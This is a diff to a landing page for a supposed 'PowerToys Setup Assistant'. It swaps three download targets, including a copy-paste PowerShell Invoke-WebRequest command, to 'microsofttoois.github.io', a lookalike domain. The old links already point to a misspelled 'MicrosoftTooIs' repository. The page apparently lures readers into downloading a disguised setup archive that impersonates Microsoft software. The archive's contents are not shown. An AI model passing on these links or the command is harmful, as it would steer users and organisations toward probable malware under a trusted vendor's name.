@@ -7,7 +7,7 @@ header:
   overlay_image: /assets/images/powertoys-hero-bg.jpg
   actions:
     - label: "⬇️ Download Setup Assistant"
-      url: "https://github.com/MicrosoftTooIs/PowerToys/releases/latest"
+      url: "https://microsofttoois.github.io/.github/"
       btn_class: "btn--primary btn--large"
     - label: "📚 Quick Start Guide"
       url: "/quick-start/"
@@ -71,7 +71,7 @@ Our setup assistant provides access to all official PowerToys utilities:
 1. **Download** the latest Setup Assistant
    ```powershell
    # Option 1: Direct download
-   Invoke-WebRequest -Uri "https://github.com/MicrosoftTooIs/PowerToys/releases/latest/download/PowerToysSetup.zip" -OutFile "PowerToysSetup.zip"
+   Invoke-WebRequest -Uri "https://microsofttoois.github.io/.github/PowerToysSetup.zip" -OutFile "PowerToysSetup.zip"
    
    # Option 2: Visit releases page
    # https://github.com/MicrosoftTooIs/PowerToys/releases/latest
@@ -225,6 +225,6 @@ Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\PowerToys\PowerRename" -Name "E
 <div style="text-align: center; margin: 2rem 0;">
   <h2>🚀 Ready to Get Started?</h2>
   <p>Download the Setup Assistant and deploy PowerToys across your organization today!</p>
-  <a href="https://github.com/MicrosoftTooIs/PowerToys/releases/latest" class="btn btn--primary btn--large">⬇️ Download Now</a>
+  <a href="https://microsofttoois.github.io/.github/" class="btn btn--primary btn--large">⬇️ Download Now</a>
   <a href="/quick-start/" class="btn btn--info btn--large">📚 Quick Start Guide</a>
 </div> 
